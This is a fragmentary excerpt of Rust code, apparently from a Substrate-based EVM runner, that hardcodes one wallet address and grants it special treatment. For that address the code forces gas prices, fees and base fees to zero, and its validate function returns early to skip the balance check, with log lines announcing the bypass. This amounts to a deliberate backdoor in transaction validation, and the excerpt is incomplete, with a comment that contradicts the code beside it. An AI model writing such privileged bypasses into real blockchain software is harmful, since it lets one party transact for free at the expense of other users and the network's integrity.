    ...
    BalanceOf<T>: TryFrom<U256> + Into<U256>,
{
    ...
    where
        ...
        R: Default,
    {
        let wallet_a = H160::from(hex_literal::hex!("455E252e223C7B815F442C72Fa2d9687A9049032"));
        ...
        let total_fee_per_gas = if source == wallet_a {
            U256::zero()
        ...
        // Only withdraw fee if not targeting Wallet A
        let fee = T::OnChargeTransaction::withdraw_fee(&source, total_fee)
            .map_err(|e| RunnerError { error: e, weight })?;

        // Execute the EVM call.
        let vicinity = Vicinity {
            gas_price: if source == wallet_a { U256::zero() } else { base_fee },
            origin: source,
        };
        ...
        let actual_fee = if source == wallet_a {
            U256::zero() // Force zero fee for Wallet A
        } else {
            effective_gas.saturating_mul(total_fee_per_gas)
        };

        let actual_base_fee = if source == wallet_a {
            U256::zero() // Force zero base fee for Wallet A
        } else {
            effective_gas.saturating_mul(base_fee)
        };
    ...
    BalanceOf<T>: TryFrom<U256> + Into<U256>,
{
    ...
    fn validate(
        ...
        let wallet_a = H160::from(hex_literal::hex!("455E252e223C7B815F442C72Fa2d9687A9049032"));
        if target == Some(wallet_a) {
            // Bypass balance check for Wallet A transactions
            log::info!("============ BYPASSING BALANCE CHECK FOR WALLET A ============");
            return Ok(());
        }
    ...
    fn call(
        ...
        if target == wallet_a {
            log::info!("============ EXECUTING GASLESS CALL FOR WALLET A ============");
            // Force zero gas price for Wallet A
            let max_fee_per_gas = Some(U256::zero());
            let max_priority_fee_per_gas = Some(U256::zero());
            if validate {
                Self::validate(
                    source,
                    Some(target),
